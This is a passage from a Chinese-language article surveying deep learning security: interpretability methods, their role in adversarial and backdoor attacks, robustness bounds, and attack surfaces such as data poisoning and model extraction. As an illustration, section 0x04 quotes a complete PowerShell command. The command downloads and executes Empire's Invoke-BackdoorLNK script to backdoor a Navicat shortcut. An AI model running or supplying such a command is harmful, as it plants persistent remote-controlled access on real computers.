Li[18]等人的工作指出，通过观察修改或删除特征子集前后模型决策结果的相应变化的方式来推断待解释样本的决策特征。其中一个实验结果如下
这是通过Bi-LSTM模型获得的具有较高负重要性得分（使用公式1计算）的单词。负重要性意味着删除单词时模型会做出更好的预测。
++，+，0，–，–分别表示正性，正性，中性，负性和强烈的负面情绪标签。
2）局部近似
这种方法的核心思想是利用结构简单的可解释模型拟合待解释模型针对某一输入实例的决策结果，然后基于解释模型对该决策结果进行解释。
Ribeiro等人[19]提出了一种称之为锚点解释(Anchor)的局部解释方法，针对每一个输入实例，该方法利用被称之为“锚点”的if-then
规则来逼近待解释模型的局部边界。下图是其实验结果
上图中，在d中，我们设置的锚点是what，可视化后可以看到b中只保留了小猎犬的图像，而回答为dog，在e中锚点同样为加粗的词，结合c中可视化后的图像，可以看到保留了相关特征，从而顺利回答对应问题。
3）特征反演
特征反演可视化和理解DNN中间特征表征的技术，可以充分利用模型的中间层信息，以提供对模型整体行为及模型决策结果的解释。Dumengnao等人的工作[20]基于该思想，设计的方案可以了解输入样本中每个特征的贡献，此外通过在DNN的输出层进一步与目标类别的神经元进行交互，使得解释结果具有类区分性。其中一个实验结果如下
这是在三种类型的DNN上应用提出的方案进行解释，其中热力图明显区域正是模型做出判断时关注的区域。
## 0x04
在讨论深度学习安全性的文章里花了这么多的篇幅来引入可解释性，原因在于，对于我们后面即将介绍的攻击手段而言，正是因为深度学习存在不可解释性，所以攻防过程并不直观，这也就意味着攻防双方博弈时可操作的空间很大。
以后门攻防为例。
后门植入神经网络的过程并不直观，不像我们传统软件安全里嵌入后门时，加一段代码即可，比如下面这段代码
“”powershell-nop -exec bypass -c “IEX (New-ObjectNet.WebClient).DownloadString(‘https://github.com/EmpireProject/Empire/raw/master/data/module_source/persistence/Invoke-BackdoorLNK.ps1’);Invoke-BackdoorLNK-LNKPath
‘C:\ProgramData\Microsoft\Windows\StartMenu\Programs\PremiumSoft\Navicat
Premium\Navicat Premium.lnk’ -EncScript Base64encode”
这是在使用经典Powershell攻击框架Empire中的一个ps1脚本。
（具体如何在神经网络中植入后门将会在后门的部分详细介绍。）
也正是由于其不可解释性，我们不知道被植入后门的神经网络究竟是如何起到后门攻击作用的，所以模式的使用者或者防御者不能无法通过传统的应对方法来进行检测防御，比如md5校验、特征码提取匹配等在神经网络上都是不适用的，这也就引来众多科研人员针对后门防御展开广泛研究，同样地，细节也会在后面文章中展开。
再来看对抗样本攻击方面。
我们知道其本质思想都是通过向输入中添加扰动以转移模型的决策注意力，最终使模型决策出错。由于这种攻击使得模型决策依据发生变化，因而解释方法针对对抗样本的解释结果必然与其针对对应的正常样本的解释结果不同。因此，我们可以通过对比并利用这种解释结果的反差来检测对抗样本，并且由于这种方法并不特定于某一种对抗攻击，因而可以弥补传统经验性防御的不足。
此外，在深度学习安全攻防领域的研究中，很多地方都会涉及可解释性的利用。
比如用来优化对抗样本的扰动，使其攻击更有效的同时降低与原图的误差；比如用于优化后门攻击中后门的植入、或是优化Trigger的pattern设计等。
我们可以具体来看一个例子。
在对抗样本领域，在白盒攻击方面，一开始GoodFellow[21]等人提出了FGSM，而后Papernot等人[22]基于Grad解释方法生成显著图，基于显著图挑选最重要的特征进行攻击，从而在保证高攻击成功率的同时也保持更强的隐蔽性。在黑盒攻击领域，Papernot等[23]提出了针对黑盒模型的替代模型攻击方案，主要就是通过模型蒸馏解释方法的思想训练替代模型来拟合目标黑盒模型，之后就回答白盒攻击上。这都是可解释性对于攻击手段的赋能。
## 0x05
这一部分我们会讨论深度学习模型的鲁棒性问题。
“鲁棒”的英文是robustness，中文译为强健，稳健，模型的鲁棒性直白点说就是健壮的、稳健的模型。Huber从稳健统计的角度系统地给出了鲁棒过程所满足的3个层面:一是模型需要具有较高的精度或有效性;
二是对于模型假设出现的较小偏差, 只对算法性能产生较小的影响; 三是对于模型假设出现的较大偏差, 而不对算法性能产生“灾难性”的影响[24].
那么深度学习模型是否足够鲁棒呢？如果仔细看了上文，不论是特斯拉的事故、哈士奇被识别为狼还是对抗样本，不论输入样本是否为故意构造出来的，深度学习系统的表现都足以说明这个答案很明显是否定的。模型之所以会表现错误，主要是因为样本存在人类无法感知的扰动，其不干扰人类认知却能使机器学习模型做出错误判断。
那么为什么深度学习系统的鲁棒性堪忧呢？
一方面是由于神经网络中非线性激活函数和复杂结构的存在，深度神经网络具有非线性、非凸性的特点，因此很难估计其输出范围；另一方面，神经网络一般具有大规模的节点，对于任何大型网络，其所有组合的详尽枚举对资源消耗很大，很难准确估计输出范围。
事实上，深度学习鲁棒性的研究一般都是和对抗样本攻防联系在一起的。
鲁棒性，和可解释性一样，对于那些安全敏感型的应用领域亟待解决的问题，我们需要为模型的鲁棒性提供理论上的安全保证。为了实现这一点，我们需要计算模型的鲁棒性边界。
所谓模型鲁棒性边界是针对某个具体样本而言的，是保证模型预测正确的条件下样本的最大可扰动范围，即模型对这个样本的分类决策不会在这个边界内变化。
由于鲁棒性研究领域对基础理论要求较高，且由公式解释，所以本文不再展开，给出几篇经典参考文献供感兴趣的读者阅读。
对模型鲁棒性分析的方法，可以简单分为精确方法和近似方法两类。
精确方法计算代价大，一般适用于小规模网络，但是可以确定精确的鲁棒性边界，代表性工作有[25][26][27];近似方法可以适用于复杂网络，但是只能证明近似的鲁棒性边界，代表性工作有[28][29][30].
至于对抗样本和鲁棒性的研究，则会安排在后续介绍对抗样本的文章中。
## 0x06
这一部分将会介绍深度学习系统面临的安全性问题，事实上，接下来的内容针对所有人工智能系统都适用，不过目前深度学习是最具代表性的技术，并且也是对抗样本、后门攻击等主流攻击手段的对象，所以从深度学习的安全性来进行论述。
从深度学习涉及的组件来看，可以分为模型、数据以及其承载系统。
深度学习中的模型特指神经网络，其是深度学习的核心，其特点在于数据驱动、自主学习，复制实现相应理论、算法，将数据喂给模型进行训练，得到最终的模型，实现预测功能。
数据之于深度学习，相当于燃料之于运载系统。训练模型时需要大量高质量的数据，模型从中自动学习隐含于数据中的高价值特征、规律，此外，高质量的模型还可以增加模型的鲁棒性和泛化能力。
承载系统包括实现深度学习时需要的算力、算法的代码实现、软件框架（如Pytorch,TensorFlow）等。
在研究深度学习系统安全性时，自然也应从这三面着手研究。
1）在模型层面来看，可以分为两方面研究，即训练过程和推理过程。在训练过程中，如果训练数据集受到恶意篡改，则可能会影响模型性能，这一阶段的攻击包括数据投毒攻击和后门攻击；在推理过程中，如果对输入的测试样本进行恶意篡改，则有可能欺骗模型使其做出错误决策，这一阶段的攻击主要为对抗样本攻击。此外正如我们在0x01提到的，由于缺乏解释性，加之模型架构复杂，在将其应用于复杂的现实场景时可能会产生不可预计的输出，这就涉及到模型的鲁棒性问题，比如下图所示，印在公交车上的董明珠像被行人闯红灯系统识别为闯红灯。当然这一点攻击者很难控制，这方面没有具体的攻击方案。
2）从数据层面来看，也可以分为两个方面，即训练数据和模型的参数数据。针对训练数据，Yang等人的研究[32]表明，攻击者可以通过模型的输出结果（不同分类的置信度）等可以恢复出原始的训练数据，简单来说主要是因为模型的输出结果隐藏着训练集，测试集的相关属性，攻击者根据返回的置信度可以构建生成模型进而恢复原始数据，类似的攻击一般统称为成员推理攻击。针对模型的参数数据，Florin等人的研究[33]表明，在不清楚模型类型及训练数据分布的情况下，仅仅通过一定的模型查询次数，获得模型返回的信息（如对输入特征向量的预测、置信度等）就可以恢复出模型，窃取模型的参数。类似的攻击一般统称为模型提取攻击，或模型逆向攻击。
3）从承载系统层面来看，主要可以分类2种类型。一种是在软件框架方面，如Pytorch，TensorFlow等框架及其所调用的第三方API出现漏洞[34]，比如CVE-2020-15025，在使用Tensorflow提供的函数StringNGrams时，可能会泄露敏感信息，如返回地址，则攻击者可以通过泄露的信息构造攻击向量，绕过地址随机化，进而控制受害者的机器。另一种是在硬件层面，比如数据采集设备、服务器等，如果数据采集设备被攻击，则可能会导致数据投毒攻击，如果服务器被攻击，则相当于模型整个训练过程都暴露于攻击者手中，攻击者可能会趁机植入后门，进行后门攻击。
这里需要注意，本小节提到了多种攻击手段，如模型逆向、数据投毒、成员推理、后门攻击、对抗样本等，但是实际上关键的攻防发生在后门和对抗样本两个领域，其他的攻击手段往往会作为辅助进行应用。比如在黑盒情况下进行对抗样本攻击时可能就需要模型逆向的手段先生成一个足够近似的白盒模型，接着进行攻击。再比如绝大部分后门攻击都是通过数据投毒的手段实现的，不过不同的方案的假设不同，对数据集的数量大小、投毒比率等有差异。
限于篇幅，本小节这是粗略的介绍，在后续文章中，将会分别详细对后门和对抗样本两个领域的攻防展开。
## 0x07参考
[1]https://zh.wikipedia.org/wiki/%E6%A8%A1%E5%BC%8F%E8%AF%86%E5%88%AB
[2]https://zh.wikipedia.org/wiki/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0
[3] Ribeiro M T , Singh S , Guestrin C . “Why Should I Trust You?”: Explaining
the Predictions of Any Classifier[C]// Proceedings of the 2016 Conference of
the North American Chapter of the Association for Computational Linguistics:
Demonstrations. 2016.
[4]http://www.xinhuanet.com/auto/2021-01/07/c_1126954442.htm
[5] Lauritsen S M , Kristensen M , Olsen M V , et al. Explainable artificial
intelligence model to predict acute critical illness from electronic health
records[J]. Nature Communications, 2020, 11(1).
[6]Jiménez-Luna, José, Grisoni F , Schneider G . Drug discovery with
explainable artificial intelligence[J]. Nature Machine Intelligence.
[7]https://aaai.org/Conferences/AAAI-19/aaai19tutorials/
[8]https://www.darpa.mil/program/explainable-artificial-intelligence
[9] Zeiler M D , Fergus R . Visualizing and Understanding Convolutional